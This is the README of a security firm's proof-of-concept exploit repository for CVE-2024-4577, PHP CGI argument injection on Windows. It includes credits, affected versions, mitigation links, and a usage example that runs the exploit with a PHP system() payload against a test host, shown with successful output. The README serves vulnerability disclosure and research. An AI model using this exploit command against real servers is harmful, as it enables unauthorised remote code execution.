# CVE-2024-4577
A Proof of Concept developed by [@watchTowr](https://twitter.com/watchtowrcyber) exploiting the PHP CGI Argument Injection vulnerability (CVE-2024-4577) to obtain RCE on a vulnerable PHP version running in a Windows environment. [Detailed technical analysis for this vulnerability](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)

<p align="center">
  <img src="/poc.gif" />
</p>


# Orange Tsi 🍊

This vulnerability was found by [Orange Tsai (@orange_8361)](https://x.com/orange_8361) of [DEVCORE (@d3vc0r3)](https://x.com/d3vc0r3). Make sure to follow his outstanding research, our role was to only recreate and develop the exploit for this issue.

# PoC || GTFO
```
python watchTowr-vs-php_cve-2024-4577.py -c "<?php system('calc');?>" -t http://192.168.253.132/test.sina
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]
(^_^) prepare for the Pwnage (^_^)

(+) Exploit was successful
```

# Affected Versions

based on the original [blog post by DEVCORE (@d3vc0r3)](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/) This vulnerability affects all versions of PHP installed on the Windows operating system:
```
PHP 8.3 < 8.3.8
PHP 8.2 < 8.2.20
PHP 8.1 < 8.1.29
```
Since the branch of PHP 8.0, PHP 7, and PHP 5 are End-of-Life, and are no longer maintained anymore, server admins can refer to the Am I Vulnerable section [HERE](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/) to find temporary patch recommendations in the Mitigation Measure section.

# Exploit authors
[Aliz (@AlizTheHax0r)](https://x.com/AlizTheHax0r) and [Sina Kheirkhah (@SinSinology)](https://x.com/SinSinology) of [watchTowr (@watchtowrcyber)](https://twitter.com/watchtowrcyber) 

# Follow [watchTowr](https://watchTowr.com) Labs 
For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://twitter.com/watchtowrcyber
- https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
- https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html
- https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/

